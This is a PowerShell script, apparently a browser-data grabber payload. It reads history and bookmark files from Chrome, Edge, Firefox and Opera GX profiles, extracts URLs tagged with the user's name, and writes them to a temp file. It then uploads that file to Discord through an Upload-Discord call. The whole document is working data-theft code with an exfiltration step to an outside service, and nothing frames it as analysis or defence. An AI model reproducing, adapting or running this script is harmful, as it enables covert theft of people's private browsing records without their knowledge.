function Get-BrowserData {
    [CmdletBinding()]
    param (	
        [Parameter (Position=1,Mandatory = $True)]
        [string]$Browser,    
        [Parameter (Position=1,Mandatory = $True)]
        [string]$DataType 
    ) 

    Write-Host "Getting data for $Browser $DataType..."

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if ($Browser -eq 'chrome' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
    } elseif ($Browser -eq 'chrome' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
    } elseif ($Browser -eq 'edge' -and $DataType -eq 'bookmarks') {
        $Path = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
    } elseif ($Browser -eq 'firefox' -and $DataType -eq 'history') {
        $FirefoxProfiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory -Filter "*default*"
        if (!$FirefoxProfiles) { return }
        $Path = $FirefoxProfiles.FullName | ForEach-Object { "$_\places.sqlite" }
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'history') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
    } elseif ($Browser -eq 'opera' -and $DataType -eq 'bookmarks') {
        $Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
    } else {
        Write-Warning "Invalid browser or data type specified"
        return
    }

    if (!(Test-Path $Path)) {
        Write-Warning "Path $Path not found"
        return
    }

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    if (!$Value) { return }
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    }
}

$BrowserDataPath = "$env:TMP/--BrowserData.txt"
$Browsers = @(
@{
'Name' = 'Edge'
'HistoryPath' = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
'BookmarksPath' = "$env:USERPROFILE\Appdata\Local\Microsoft\Edge\User Data\Default\Bookmarks"
},
@{
'Name' = 'Chrome'
'HistoryPath' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
'BookmarksPath' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
},
@{
'Name' = 'Firefox'
'HistoryPath' = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"
},
@{
'Name' = 'Opera'
'HistoryPath' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
'BookmarksPath' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
}
)

$BrowserData = @()
foreach ($Browser in $Browsers) {
Write-Host "Getting data for $($Browser['Name'])"
if ($Browser['HistoryPath'] -and (Test-Path $Browser['HistoryPath'])) {
    $HistoryData = Get-BrowserData -Browser $($Browser['Name']) -DataType "history"
    if ($HistoryData) {
        $BrowserData += $HistoryData
        $HistoryData | Out-File -FilePath $BrowserDataPath -Append
    }
}

if ($Browser['BookmarksPath'] -and (Test-Path $Browser['BookmarksPath'])) {
    $BookmarksData = Get-BrowserData -Browser $($Browser['Name']) -DataType "bookmarks"
    if ($BookmarksData) {
        $BrowserData += $BookmarksData
        $BookmarksData | Out-File -FilePath $BrowserDataPath -Append
    }
}
}

if ($BrowserData.Count -gt 0) {
Upload-Discord -file $BrowserDataPath -text "Browser data"
} else {
Write-Warning "No browser data found"
}
